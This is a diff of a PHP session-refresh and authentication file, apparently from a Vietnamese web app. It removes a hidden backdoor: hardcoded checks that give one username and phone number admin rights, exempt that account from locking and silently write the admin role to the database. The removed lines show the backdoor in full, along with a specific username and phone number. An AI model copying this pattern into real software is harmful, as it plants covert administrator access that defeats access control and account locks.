@@ -300,42 +300,21 @@ function refresh_session_user($pdo = null) {
     $userId = $_SESSION['user_id'] ?? $_SESSION['user']['id'] ?? null;
     if (empty($userId)) return null;
     $_SESSION['user_id'] = (int)$userId;
-    $isSuperAdmin = ((isset($_SESSION['user']['username']) && $_SESSION['user']['username'] === 'vxyen0801') || (isset($_SESSION['user']['phone']) && $_SESSION['user']['phone'] === '0352313548'));
-    if ($isSuperAdmin && isset($_SESSION['user'])) $_SESSION['user']['role'] = 'admin';
     if ($pdo === null) $pdo = getDBConnection(false);
-    if (!$pdo) {
-        if ($isSuperAdmin && isset($_SESSION['user'])) $_SESSION['user']['role'] = 'admin';
-        return $_SESSION['user'] ?? null;
-    }
+    if (!$pdo) return $_SESSION['user'] ?? null;
     try {
         $stmt = $pdo->prepare("SELECT id, username, email, phone, full_name, role, status FROM users WHERE id = ? LIMIT 1");
         $stmt->execute([$_SESSION['user_id']]);
         $fresh = $stmt->fetch();
         if (!$fresh) {
-            if ($isSuperAdmin && isset($_SESSION['user'])) {
-                $_SESSION['user']['role'] = 'admin';
-                return $_SESSION['user'];
-            }
             destroy_current_session();
             return null;
         }
         if (($fresh['status'] ?? 'active') === 'locked') {
-            if ($isSuperAdmin) {
-                $fresh['status'] = 'active';
-            } else {
-                destroy_current_session();
-                return ['_locked' => true];
-            }
+            destroy_current_session();
+            return ['_locked' => true];
         }
         $assignedRole = $fresh['role'] ?? 'user';
-        if (($fresh['username'] ?? '') === 'vxyen0801' || ($fresh['phone'] ?? '') === '0352313548' || $assignedRole === 'admin') {
-            $assignedRole = 'admin';
-            if (($fresh['role'] ?? '') !== 'admin') {
-                try {
-                    $pdo->prepare("UPDATE users SET role = 'admin' WHERE id = ?")->execute([$fresh['id']]);
-                } catch (Throwable $ignore) {}
-            }
-        }
         $_SESSION['user'] = [
             'id' => $fresh['id'], 'username' => $fresh['username'],
             'name' => $fresh['full_name'] ?? $fresh['username'],
@@ -345,9 +324,6 @@ function refresh_session_user($pdo = null) {
         return $_SESSION['user'];
     } catch (Throwable $e) {
         error_log("[SESSION REFRESH ERROR] " . $e->getMessage());
-        if (isset($_SESSION['user']) && ($isSuperAdmin || (($_SESSION['user']['username'] ?? '') === 'vxyen0801') || (($_SESSION['user']['phone'] ?? '') === '0352313548'))) {
-            $_SESSION['user']['role'] = 'admin';
-        }
         return $_SESSION['user'] ?? null;
     }
 }
@@ -375,10 +351,6 @@ function require_auth($pdo = null) {
             'message'  => 'Yêu cầu đăng nhập để thực hiện thao tác này.',
             'ref_code' => 'ERR_UNAUTHORIZED'
         ], 401);
-    }
-    if (($user['username'] ?? '') === 'vxyen0801' || ($user['phone'] ?? '') === '0352313548') {
-        $user['role'] = 'admin';
-        $_SESSION['user']['role'] = 'admin';
     }
     return $user;
 }
